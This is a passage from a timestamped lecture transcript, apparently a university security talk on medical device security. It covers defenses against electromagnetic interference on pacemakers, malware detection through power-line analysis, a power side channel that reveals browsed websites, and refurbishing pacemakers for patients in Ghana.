              <time_slice>51:13</time_slice>
              <text_slice>There is a silver
lining, though.</text_slice>
            </slice>
            <slice>
              <time_slice>51:15</time_slice>
              <text_slice>The good news is, that
only works in vitro.</text_slice>
            </slice>
            <slice>
              <time_slice>51:18</time_slice>
              <text_slice>Whenever we would do
this in saline solution</text_slice>
            </slice>
            <slice>
              <time_slice>51:21</time_slice>
              <text_slice>or in anything that
approximated the body,</text_slice>
            </slice>
            <slice>
              <time_slice>51:23</time_slice>
              <text_slice>it basically didn't work.</text_slice>
            </slice>
            <slice>
              <time_slice>51:25</time_slice>
              <text_slice>And that's because
your body absorbs</text_slice>
            </slice>
            <slice>
              <time_slice>51:26</time_slice>
              <text_slice>a lot of that RF energy,
and it doesn't actually</text_slice>
            </slice>
            <slice>
              <time_slice>51:30</time_slice>
              <text_slice>get to the sensor.</text_slice>
            </slice>
            <slice>
              <time_slice>51:31</time_slice>
              <text_slice>So the closest we were
able to get this to work</text_slice>
            </slice>
            <slice>
              <time_slice>51:34</time_slice>
              <text_slice>was, with the saline,
like three centimeters.</text_slice>
            </slice>
            <slice>
              <time_slice>51:39</time_slice>
              <text_slice>So that basically
means there's no worry</text_slice>
            </slice>
            <slice>
              <time_slice>51:41</time_slice>
              <text_slice>for this particular kind of
interference from an implant.</text_slice>
            </slice>
            <slice>
              <time_slice>51:44</time_slice>
              <text_slice>However, an externally
worn device, we don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>51:47</time_slice>
              <text_slice>We hadn't done any tests
on insulin pumps yet.</text_slice>
            </slice>
            <slice>
              <time_slice>51:50</time_slice>
              <text_slice>There are plenty
of different kinds.</text_slice>
            </slice>
            <slice>
              <time_slice>51:52</time_slice>
              <text_slice>There's glucose
sensors, for instance,</text_slice>
            </slice>
            <slice>
              <time_slice>51:53</time_slice>
              <text_slice>that are percutaneous.</text_slice>
            </slice>
            <slice>
              <time_slice>51:57</time_slice>
              <text_slice>I wouldn't be surprised
if someone here has one.</text_slice>
            </slice>
            <slice>
              <time_slice>52:00</time_slice>
              <text_slice>They're pretty common.</text_slice>
            </slice>
            <slice>
              <time_slice>52:01</time_slice>
              <text_slice>But we just don't know yet.</text_slice>
            </slice>
            <slice>
              <time_slice>52:04</time_slice>
              <text_slice>But one of the approaches
we're taking to solve this</text_slice>
            </slice>
            <slice>
              <time_slice>52:10</time_slice>
              <text_slice>follows the end-to-end
principle to some extent.</text_slice>
            </slice>
            <slice>
              <time_slice>52:12</time_slice>
              <text_slice>A lot of these, I
just don't think</text_slice>
            </slice>
            <slice>
              <time_slice>52:14</time_slice>
              <text_slice>the analog is able
to distinguish good</text_slice>
            </slice>
            <slice>
              <time_slice>52:16</time_slice>
              <text_slice>from bad signal.</text_slice>
            </slice>
            <slice>
              <time_slice>52:17</time_slice>
              <text_slice>And so you have to do it closer
to the application layer.</text_slice>
            </slice>
            <slice>
              <time_slice>52:20</time_slice>
              <text_slice>So one of the defenses that we
tried out was the following.</text_slice>
            </slice>
            <slice>
              <time_slice>52:27</time_slice>
              <text_slice>It has its own limitations,
but here's the basic idea.</text_slice>
            </slice>
            <slice>
              <time_slice>52:30</time_slice>
              <text_slice>So imagine you're a pacemaker,
and you want to know,</text_slice>
            </slice>
            <slice>
              <time_slice>52:32</time_slice>
              <text_slice>are you getting a
trustworthy signal?</text_slice>
            </slice>
            <slice>
              <time_slice>52:35</time_slice>
              <text_slice>So what you do is
you selectively</text_slice>
            </slice>
            <slice>
              <time_slice>52:37</time_slice>
              <text_slice>choose to send test pulses every
now and then, to basically keep</text_slice>
            </slice>
            <slice>
              <time_slice>52:41</time_slice>
              <text_slice>the adversary in check.</text_slice>
            </slice>
            <slice>
              <time_slice>52:43</time_slice>
              <text_slice>So here's the interesting thing
we discovered when we worked</text_slice>
            </slice>
            <slice>
              <time_slice>52:45</time_slice>
              <text_slice>with electrophysiologists.</text_slice>
            </slice>
            <slice>
              <time_slice>52:47</time_slice>
              <text_slice>We learned that if you
send a pacing pulse</text_slice>
            </slice>
            <slice>
              <time_slice>52:49</time_slice>
              <text_slice>to a heart that recently was
beating, within about 200</text_slice>
            </slice>
            <slice>
              <time_slice>52:52</time_slice>
              <text_slice>milliseconds, that cardiac
tissue is physically</text_slice>
            </slice>
            <slice>
              <time_slice>52:55</time_slice>
              <text_slice>incapable of beating again.</text_slice>
            </slice>
            <slice>
              <time_slice>52:57</time_slice>
              <text_slice>It's also physically
incapable of sending out</text_slice>
            </slice>
            <slice>
              <time_slice>53:00</time_slice>
              <text_slice>an electrical
response, just because</text_slice>
            </slice>
            <slice>
              <time_slice>53:01</time_slice>
              <text_slice>of the polarization-- the way
that cardiac tissue works.</text_slice>
            </slice>
            <slice>
              <time_slice>53:05</time_slice>
              <text_slice>So we said, so what would happen
if we send an extra pacing</text_slice>
            </slice>
            <slice>
              <time_slice>53:08</time_slice>
              <text_slice>pulse right after a
ventricular sense?</text_slice>
            </slice>
            <slice>
              <time_slice>53:11</time_slice>
              <text_slice>He said, oh, well,
if the heart actually</text_slice>
            </slice>
            <slice>
              <time_slice>53:14</time_slice>
              <text_slice>had beat, as your
sensor told you,</text_slice>
            </slice>
            <slice>
              <time_slice>53:17</time_slice>
              <text_slice>then you should get no response.</text_slice>
            </slice>
            <slice>
              <time_slice>53:18</time_slice>
              <text_slice>Because it would be incapable
of sending a response.</text_slice>
            </slice>
            <slice>
              <time_slice>53:21</time_slice>
              <text_slice>So therefore, if we
saw the heart send us</text_slice>
            </slice>
            <slice>
              <time_slice>53:23</time_slice>
              <text_slice>an electrical signal
back, we knew-- then</text_slice>
            </slice>
            <slice>
              <time_slice>53:26</time_slice>
              <text_slice>that proves to us
that we were fooled</text_slice>
            </slice>
            <slice>
              <time_slice>53:28</time_slice>
              <text_slice>on the previous heartbeat.</text_slice>
            </slice>
            <slice>
              <time_slice>53:29</time_slice>
              <text_slice>And there we raise
our warning signs</text_slice>
            </slice>
            <slice>
              <time_slice>53:32</time_slice>
              <text_slice>that it appears to
be we're getting</text_slice>
            </slice>
            <slice>
              <time_slice>53:34</time_slice>
              <text_slice>intentional electromagnetic
interference.</text_slice>
            </slice>
            <slice>
              <time_slice>53:36</time_slice>
              <text_slice>So the basic idea is,
again, we probe it,</text_slice>
            </slice>
            <slice>
              <time_slice>53:38</time_slice>
              <text_slice>and we make use
of some of what we</text_slice>
            </slice>
            <slice>
              <time_slice>53:40</time_slice>
              <text_slice>know about the
physiology of the body</text_slice>
            </slice>
            <slice>
              <time_slice>53:42</time_slice>
              <text_slice>to have better trustworthiness.</text_slice>
            </slice>
            <slice>
              <time_slice>53:45</time_slice>
              <text_slice>Another approach we didn't
look into too deeply</text_slice>
            </slice>
            <slice>
              <time_slice>53:48</time_slice>
              <text_slice>was looking at
propagation delay.</text_slice>
            </slice>
            <slice>
              <time_slice>53:50</time_slice>
              <text_slice>Because if you have
electromagnetic interference</text_slice>
            </slice>
            <slice>
              <time_slice>53:52</time_slice>
              <text_slice>coming at you, it's
basically light, right?</text_slice>
            </slice>
            <slice>
              <time_slice>53:54</time_slice>
              <text_slice>Speed of light.</text_slice>
            </slice>
            <slice>
              <time_slice>53:55</time_slice>
              <text_slice>And if it's hitting you all at
once, if you have two sensors,</text_slice>
            </slice>
            <slice>
              <time_slice>53:59</time_slice>
              <text_slice>and you simultaneously see
the same cardiac signal</text_slice>
            </slice>
            <slice>
              <time_slice>54:02</time_slice>
              <text_slice>at the same time,
something's wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>54:04</time_slice>
              <text_slice>Because there's an
electrochemical propagation</text_slice>
            </slice>
            <slice>
              <time_slice>54:07</time_slice>
              <text_slice>delay from your vagus nerve
as the electrical signal</text_slice>
            </slice>
            <slice>
              <time_slice>54:10</time_slice>
              <text_slice>is traveling down
through your heart.</text_slice>
            </slice>
            <slice>
              <time_slice>54:12</time_slice>
              <text_slice>So there are other ways
to try to tease out</text_slice>
            </slice>
            <slice>
              <time_slice>54:14</time_slice>
              <text_slice>whether the physiologic
signal is trustworthy,</text_slice>
            </slice>
            <slice>
              <time_slice>54:18</time_slice>
              <text_slice>but this is new ground.</text_slice>
            </slice>
            <slice>
              <time_slice>54:19</time_slice>
              <text_slice>There's not a lot going
on in this space yet.</text_slice>
            </slice>
            <slice>
              <time_slice>54:22</time_slice>
              <text_slice>A lot of fun projects for
graduate and undergraduate</text_slice>
            </slice>
            <slice>
              <time_slice>54:25</time_slice>
              <text_slice>research.</text_slice>
            </slice>
            <slice>
              <time_slice>54:29</time_slice>
              <text_slice>We end at-- oh, 25?</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>Oh.</text_slice>
            </slice>
            <slice>
              <time_slice>54:33</time_slice>
              <text_slice>So I want to tell you
about another project,</text_slice>
            </slice>
            <slice>
              <time_slice>54:38</time_slice>
              <text_slice>and that is detecting
malware at power outlets.</text_slice>
            </slice>
            <slice>
              <time_slice>54:41</time_slice>
              <text_slice>So a few years ago, one of
my students, Shane, he said,</text_slice>
            </slice>
            <slice>
              <time_slice>54:47</time_slice>
              <text_slice>hey, I built this power
outlet, and I can tell</text_slice>
            </slice>
            <slice>
              <time_slice>54:50</time_slice>
              <text_slice>what website you're browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>54:52</time_slice>
              <text_slice>So he put a little
sense resistor in here,</text_slice>
            </slice>
            <slice>
              <time_slice>54:57</time_slice>
              <text_slice>and he measures what's
called the phase</text_slice>
            </slice>
            <slice>
              <time_slice>54:59</time_slice>
              <text_slice>shift in the reactive power.</text_slice>
            </slice>
            <slice>
              <time_slice>55:01</time_slice>
              <text_slice>It's basically a proxy for
the load on your computer.</text_slice>
            </slice>
            <slice>
              <time_slice>55:05</time_slice>
              <text_slice>And he can basically tell
how your computer-- how</text_slice>
            </slice>
            <slice>
              <time_slice>55:08</time_slice>
              <text_slice>your processor is
changing the load as it's</text_slice>
            </slice>
            <slice>
              <time_slice>55:11</time_slice>
              <text_slice>going out onto the
AC power system.</text_slice>
            </slice>
            <slice>
              <time_slice>55:14</time_slice>
              <text_slice>This is not new.</text_slice>
            </slice>
            <slice>
              <time_slice>55:15</time_slice>
              <text_slice>Has anyone heard of Tempest?</text_slice>
            </slice>
            <slice>
              <time_slice>55:17</time_slice>
              <text_slice>Tempest protection?</text_slice>
            </slice>
            <slice>
              <time_slice>55:18</time_slice>
              <text_slice>A few of you.</text_slice>
            </slice>
            <slice>
              <time_slice>55:19</time_slice>
              <text_slice>So Tempest has been
around for years.</text_slice>
            </slice>
            <slice>
              <time_slice>55:22</time_slice>
              <text_slice>Basically signals leak
all over the place,</text_slice>
            </slice>
            <slice>
              <time_slice>55:25</time_slice>
              <text_slice>and so there's a whole fine
art to stopping signals</text_slice>
            </slice>
            <slice>
              <time_slice>55:27</time_slice>
              <text_slice>from leaking.</text_slice>
            </slice>
            <slice>
              <time_slice>55:29</time_slice>
              <text_slice>What was interesting
to me was, I</text_slice>
            </slice>
            <slice>
              <time_slice>55:31</time_slice>
              <text_slice>like to keep all my old
computers-- actually</text_slice>
            </slice>
            <slice>
              <time_slice>55:33</time_slice>
              <text_slice>I have an exokernel machine.</text_slice>
            </slice>
            <slice>
              <time_slice>55:35</time_slice>
              <text_slice>And it's an old-- I
think it's a Pentium 4.</text_slice>
            </slice>
            <slice>
              <time_slice>55:39</time_slice>
              <text_slice>And this was before there was
advanced power management.</text_slice>
            </slice>
            <slice>
              <time_slice>55:41</time_slice>
              <text_slice>So if you measured the power
coming out of this old Pentium,</text_slice>
            </slice>
            <slice>
              <time_slice>55:44</time_slice>
              <text_slice>it was constant.</text_slice>
            </slice>
            <slice>
              <time_slice>55:44</time_slice>
              <text_slice>Just doesn't matter if
you were doing anything.</text_slice>
            </slice>
            <slice>
              <time_slice>55:46</time_slice>
              <text_slice>If you have a spin while
loop, doesn't matter.</text_slice>
            </slice>
            <slice>
              <time_slice>55:49</time_slice>
              <text_slice>It's the same thing as
actually doing processing.</text_slice>
            </slice>
            <slice>
              <time_slice>55:53</time_slice>
              <text_slice>But if you buy a modern
computer, whether it be desktop</text_slice>
            </slice>
            <slice>
              <time_slice>55:56</time_slice>
              <text_slice>or phone, your workload is
being revealed over the power</text_slice>
            </slice>
            <slice>
              <time_slice>56:00</time_slice>
              <text_slice>line in subtle ways.</text_slice>
            </slice>
            <slice>
              <time_slice>56:02</time_slice>
              <text_slice>And so what he discovered was
that what's going on here.</text_slice>
            </slice>
            <slice>
              <time_slice>56:08</time_slice>
              <text_slice>If you have an
embedded system that's</text_slice>
            </slice>
            <slice>
              <time_slice>56:10</time_slice>
              <text_slice>very difficult to change, and
you want to retrofit security</text_slice>
            </slice>
            <slice>
              <time_slice>56:13</time_slice>
              <text_slice>onto it, what you can do is
put in basically a power strip.</text_slice>
            </slice>
            <slice>
              <time_slice>56:19</time_slice>
              <text_slice>An intelligent power strip.</text_slice>
            </slice>
            <slice>
              <time_slice>56:21</time_slice>
              <text_slice>And it uses machine learning
classification of the frequency</text_slice>
            </slice>
            <slice>
              <time_slice>56:25</time_slice>
              <text_slice>domain.</text_slice>
            </slice>
            <slice>
              <time_slice>56:26</time_slice>
              <text_slice>Actually looking at the
frequency components</text_slice>
            </slice>
            <slice>
              <time_slice>56:27</time_slice>
              <text_slice>of your power consumption.</text_slice>
            </slice>
            <slice>
              <time_slice>56:28</time_slice>
              <text_slice>It's not looking at how
much power you consume.</text_slice>
            </slice>
            <slice>
              <time_slice>56:31</time_slice>
              <text_slice>Instead it's looking at how
often do you consume it.</text_slice>
            </slice>
            <slice>
              <time_slice>56:34</time_slice>
              <text_slice>So let me give you
some intuition here.</text_slice>
            </slice>
            <slice>
              <time_slice>56:36</time_slice>
              <text_slice>So imagine you have
a medical device that</text_slice>
            </slice>
            <slice>
              <time_slice>56:38</time_slice>
              <text_slice>gets infected by malware.</text_slice>
            </slice>
            <slice>
              <time_slice>56:41</time_slice>
              <text_slice>Let's say this malware is going
to wake up every few minutes</text_slice>
            </slice>
            <slice>
              <time_slice>56:44</time_slice>
              <text_slice>to send out spam.</text_slice>
            </slice>
            <slice>
              <time_slice>56:46</time_slice>
              <text_slice>How might that change
the power consumption?</text_slice>
            </slice>
            <slice>
              <time_slice>56:54</time_slice>
              <text_slice>Yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>56:55</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>56:58</time_slice>
              <text_slice>PROFESSOR: Yeah, every few
minutes that interrupt's</text_slice>
            </slice>
            <slice>
              <time_slice>57:00</time_slice>
              <text_slice>going to go off, and the
processor's going to wake up.</text_slice>
            </slice>
            <slice>
              <time_slice>57:02</time_slice>
              <text_slice>It's probably going to
power up its memory.</text_slice>
            </slice>
            <slice>
              <time_slice>57:05</time_slice>
              <text_slice>It's going to do some
cycling, or it might actually</text_slice>
            </slice>
            <slice>
              <time_slice>57:09</time_slice>
              <text_slice>insert a few extra
cycles in what</text_slice>
            </slice>
            <slice>
              <time_slice>57:11</time_slice>
              <text_slice>used to be a very constant
set of instructions.</text_slice>
            </slice>
            <slice>
              <time_slice>57:14</time_slice>
              <text_slice>Medical devices generally
do a small set of things,</text_slice>
            </slice>
            <slice>
              <time_slice>57:17</time_slice>
              <text_slice>as opposed to a general
purpose computer.</text_slice>
            </slice>
            <slice>
              <time_slice>57:19</time_slice>
              <text_slice>So it's a very regular pattern.</text_slice>
            </slice>
            <slice>
              <time_slice>57:21</time_slice>
              <text_slice>So when you suddenly
have malware getting in,</text_slice>
            </slice>
            <slice>
              <time_slice>57:23</time_slice>
              <text_slice>it just changes the behavior of
its power consumption patterns.</text_slice>
            </slice>
            <slice>
              <time_slice>57:27</time_slice>
              <text_slice>So you can pick that up.</text_slice>
            </slice>
            <slice>
              <time_slice>57:28</time_slice>
              <text_slice>You do a Fourier transform.</text_slice>
            </slice>
            <slice>
              <time_slice>57:29</time_slice>
              <text_slice>You do some other magic
involving machine learning.</text_slice>
            </slice>
            <slice>
              <time_slice>57:32</time_slice>
              <text_slice>The devil's in the details.</text_slice>
            </slice>
            <slice>
              <time_slice>57:34</time_slice>
              <text_slice>But you can basically
use the machine learning</text_slice>
            </slice>
            <slice>
              <time_slice>57:36</time_slice>
              <text_slice>to identify with very high
precision, very high accuracy,</text_slice>
            </slice>
            <slice>
              <time_slice>57:40</time_slice>
              <text_slice>low false positive,
low false negative,</text_slice>
            </slice>
            <slice>
              <time_slice>57:42</time_slice>
              <text_slice>the presence of malware
and other anomalies.</text_slice>
            </slice>
            <slice>
              <time_slice>57:45</time_slice>
              <text_slice>And so that's a project
he had been working</text_slice>
            </slice>
            <slice>
              <time_slice>57:47</time_slice>
              <text_slice>on for a number of years.</text_slice>
            </slice>
            <slice>
              <time_slice>57:49</time_slice>
              <text_slice>He initially created
this project, though,</text_slice>
            </slice>
            <slice>
              <time_slice>57:52</time_slice>
              <text_slice>to identify what website
you were browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>57:54</time_slice>
              <text_slice>And unfortunately, he submitted
it to a bunch of conferences,</text_slice>
            </slice>
            <slice>
              <time_slice>57:57</time_slice>
              <text_slice>and they all said, well, why
would you ever want to do that?</text_slice>
            </slice>
            <slice>
              <time_slice>58:01</time_slice>
              <text_slice>But it's kind of interesting,
because he picked the top 50</text_slice>
            </slice>
            <slice>
              <time_slice>58:04</time_slice>
              <text_slice>Alexa websites.</text_slice>
            </slice>
            <slice>
              <time_slice>58:05</time_slice>
              <text_slice>And then he profiled
his computer,</text_slice>
            </slice>
            <slice>
              <time_slice>58:07</time_slice>
              <text_slice>used that as a training set
for the machine learning,</text_slice>
            </slice>
            <slice>
              <time_slice>58:10</time_slice>
              <text_slice>and then again, with very high
accuracy, very high precision,</text_slice>
            </slice>
            <slice>
              <time_slice>58:13</time_slice>
              <text_slice>was able to identify which
website you were going to.</text_slice>
            </slice>
            <slice>
              <time_slice>58:16</time_slice>
              <text_slice>And we were really confused
why it worked at all.</text_slice>
            </slice>
            <slice>
              <time_slice>58:19</time_slice>
              <text_slice>And we still don't
know exactly why,</text_slice>
            </slice>
            <slice>
              <time_slice>58:21</time_slice>
              <text_slice>but we have some strong hunches.</text_slice>
            </slice>
            <slice>
              <time_slice>58:22</time_slice>
              <text_slice>And [INAUDIBLE] Drupal.</text_slice>
            </slice>
            <slice>
              <time_slice>58:26</time_slice>
              <text_slice>So there's been a movement
over the last 10 years</text_slice>
            </slice>
            <slice>
              <time_slice>58:29</time_slice>
              <text_slice>on websites to move from-- who
still writes in Emacs HTML?</text_slice>
            </slice>
            <slice>
              <time_slice>58:33</time_slice>
              <text_slice>All right, me too.</text_slice>
            </slice>
            <slice>
              <time_slice>58:35</time_slice>
              <text_slice>That's why I have all these
mistakes on my website.</text_slice>
            </slice>
            <slice>
              <time_slice>58:37</time_slice>
              <text_slice>But there has been a
large movement, especially</text_slice>
            </slice>
            <slice>
              <time_slice>58:40</time_slice>
              <text_slice>in institutions, to have
code automatically generate</text_slice>
            </slice>
            <slice>
              <time_slice>58:43</time_slice>
              <text_slice>a web content file that follows
a very regular structure.</text_slice>
            </slice>
            <slice>
              <time_slice>58:47</time_slice>
              <text_slice>So can you imagine
if you go to CNN.com,</text_slice>
            </slice>
            <slice>
              <time_slice>58:49</time_slice>
              <text_slice>and they always have an ad in
the upper right-hand corner,</text_slice>
            </slice>
            <slice>
              <time_slice>58:52</time_slice>
              <text_slice>with flash animation that
lasts exactly 22 seconds?</text_slice>
            </slice>
            <slice>
              <time_slice>58:55</time_slice>
              <text_slice>So your GPU might kick in
at a very regular rate.</text_slice>
            </slice>
            <slice>
              <time_slice>58:59</time_slice>
              <text_slice>So some very interesting
things bleed through</text_slice>
            </slice>
            <slice>
              <time_slice>59:01</time_slice>
              <text_slice>into the power consumption
patterns from the web browser,</text_slice>
            </slice>
            <slice>
              <time_slice>59:04</time_slice>
              <text_slice>and from other things in
your operating system,</text_slice>
            </slice>
            <slice>
              <time_slice>59:06</time_slice>
              <text_slice>as a result of your activity.</text_slice>
            </slice>
            <slice>
              <time_slice>59:09</time_slice>
              <text_slice>The only website we couldn't
classify too well was GoDaddy.</text_slice>
            </slice>
            <slice>
              <time_slice>59:12</time_slice>
              <text_slice>We still don't know
why, but we don't care.</text_slice>
            </slice>
            <slice>
              <time_slice>59:21</time_slice>
              <text_slice>So this is going to branch
a little bit further out</text_slice>
            </slice>
            <slice>
              <time_slice>59:23</time_slice>
              <text_slice>from the security side.</text_slice>
            </slice>
            <slice>
              <time_slice>59:26</time_slice>
              <text_slice>But one of the
things you find is</text_slice>
            </slice>
            <slice>
              <time_slice>59:27</time_slice>
              <text_slice>that when you're helping your
colleagues in the hospital</text_slice>
            </slice>
            <slice>
              <time_slice>59:31</time_slice>
              <text_slice>system, they often ask
back for some of your help.</text_slice>
            </slice>
            <slice>
              <time_slice>59:34</time_slice>
              <text_slice>And one of the
interesting projects</text_slice>
            </slice>
            <slice>
              <time_slice>59:35</time_slice>
              <text_slice>that we got involved
with, purely by accident,</text_slice>
            </slice>
            <slice>
              <time_slice>59:37</time_slice>
              <text_slice>from some of the
pacemaker security work</text_slice>
            </slice>
            <slice>
              <time_slice>59:40</time_slice>
              <text_slice>was in some humanitarian
aid in developing countries,</text_slice>
            </slice>
            <slice>
              <time_slice>59:43</time_slice>
              <text_slice>especially Ghana, to
give patients new life.</text_slice>
            </slice>
            <slice>
              <time_slice>59:47</time_slice>
              <text_slice>Literally new life,
because it turns out</text_slice>
            </slice>
            <slice>
              <time_slice>59:48</time_slice>
              <text_slice>if you don't have a
health care system,</text_slice>
            </slice>
            <slice>
              <time_slice>59:50</time_slice>
              <text_slice>it's very difficult
to, say, get a $40,000</text_slice>
            </slice>
            <slice>
              <time_slice>59:52</time_slice>
              <text_slice>pacemaker plus
the surgical team.</text_slice>
            </slice>
            <slice>
              <time_slice>59:54</time_slice>
              <text_slice>Very challenging.</text_slice>
            </slice>
            <slice>
              <time_slice>59:56</time_slice>
              <text_slice>So what they've been
doing is they've</text_slice>
            </slice>
            <slice>
              <time_slice>59:58</time_slice>
              <text_slice>been recovering discarded
pacemakers and defibrillators,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:01</time_slice>
              <text_slice>and then sterilizing them.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:02</time_slice>
              <text_slice>It's actually
pretty interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:04</time_slice>
              <text_slice>You have to use-- well,
you don't have to--</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:06</time_slice>
              <text_slice>but what's typically
used is ethylene oxide.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:10</time_slice>
              <text_slice>It's a gas chamber to
sterilize and remove</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:12</time_slice>
              <text_slice>all the pyrogens,
things that cause fever.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:15</time_slice>
              <text_slice>But these devices
are sterilized,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:17</time_slice>
              <text_slice>and then reimplanted
in patients.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:18</time_slice>
              <text_slice>So here's a gentleman.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:19</time_slice>
              <text_slice>I believe he was suffering
from a slow heart</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:22</time_slice>
              <text_slice>rate, which was basically
a death sentence for him.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:25</time_slice>
              <text_slice>But because he was able
to get a pacemaker,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:27</time_slice>
              <text_slice>it gave him extra years of life.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:29</time_slice>
              <text_slice>So the problem they
came to us with was,</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:32</time_slice>
              <text_slice>how do they know if the
devices are still safe?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:35</time_slice>
              <text_slice>They weren't even used.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:36</time_slice>
              <text_slice>So obviously you can
look at the battery life.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:39</time_slice>
              <text_slice>So that's one thing you do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:40</time_slice>
              <text_slice>And if the battery
is too low, you</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:42</time_slice>
              <text_slice>would not reimplant it, because
that wouldn't last too long.</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:46</time_slice>
              <text_slice>But then what about some
of the other things?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:48</time_slice>
              <text_slice>Has some of the metal corroded?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:49</time_slice>
              <text_slice>How do we do an end-to-end
check to see if you can still</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:52</time_slice>
              <text_slice>detect arrhythmias properly?</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:54</time_slice>
              <text_slice>So the students in my lab
created a special tester</text_slice>
            </slice>
            <slice>
              <time_slice>1:00:58</time_slice>
              <text_slice>that sends out
what you would see</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:02</time_slice>
              <text_slice>from the electrical components
of cardiac arrhythmias.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:08</time_slice>
              <text_slice>Things other than sinusoid.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:10</time_slice>
              <text_slice>Cardiac rhythms that you
wouldn't want to have, right?</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:12</time_slice>
              <text_slice>So, anomalies.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:13</time_slice>
              <text_slice>And it replays these
against the pacemaker leads.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:16</time_slice>
              <text_slice>The pacemaker thinks it's
connected to the patient,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:18</time_slice>
              <text_slice>and then it responds.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:19</time_slice>
              <text_slice>And so we check
that response to see</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:21</time_slice>
              <text_slice>if it's actually diagnosing
the cardiac arrhythmias,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:23</time_slice>
              <text_slice>and whether it's actually
sending out the lifesaving</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:26</time_slice>
              <text_slice>shocks properly.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:28</time_slice>
              <text_slice>So they're now starting to
test this through the whole FDA</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:33</time_slice>
              <text_slice>process to get their blessing.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:35</time_slice>
              <text_slice>And that's a work in progress.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:37</time_slice>
              <text_slice>But it's called the My
Heart Your Heart program.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:39</time_slice>
              <text_slice>You can go look it up if
you're curious about it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:42</time_slice>
              <text_slice>And then we also
interact quite a bit</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:45</time_slice>
              <text_slice>with the medical device
manufacturing community.</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:47</time_slice>
              <text_slice>We bring them in each
summer out to Ann Arbor,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:50</time_slice>
              <text_slice>and we have the
manufacturers sit down,</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:54</time_slice>
              <text_slice>while some of the persons
who are in charge of running</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:58</time_slice>
              <text_slice>hospitals sit down
next to them, and they</text_slice>
            </slice>
            <slice>
              <time_slice>1:01:59</time_slice>
              <text_slice>start sharing their gripes and
problems with medical devices.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:05</time_slice>
              <text_slice>We had one company come in and
just reveal all the problems</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:09</time_slice>
              <text_slice>that none of the
people would respond to</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:11</time_slice>
              <text_slice>at the medical
device manufacturer.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:12</time_slice>
              <text_slice>And one guy in the corner
was like, that's my team.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:16</time_slice>
              <text_slice>And so they decided to go
out for lunch, have a beer,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:18</time_slice>
              <text_slice>and just work out the problems.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:20</time_slice>
              <text_slice>So a lot of it is cultural.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:21</time_slice>
              <text_slice>So I don't know if anyone here
has done any security analysis</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:26</time_slice>
              <text_slice>work, or reverse engineering.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:27</time_slice>
              <text_slice>Anyone here?</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:29</time_slice>
              <text_slice>Couple people.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:30</time_slice>
              <text_slice>So it's really delicate.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:32</time_slice>
              <text_slice>It's almost an
art, because you're</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:34</time_slice>
              <text_slice>dealing with the social elements
of the manufacturing side.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:37</time_slice>
              <text_slice>And it's even more so in
medical device manufacturing,</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:39</time_slice>
              <text_slice>because lives are at stake.</text_slice>
            </slice>
            <slice>
              <time_slice>1:02:41</time_slice>
              <text_slice>And so it can be
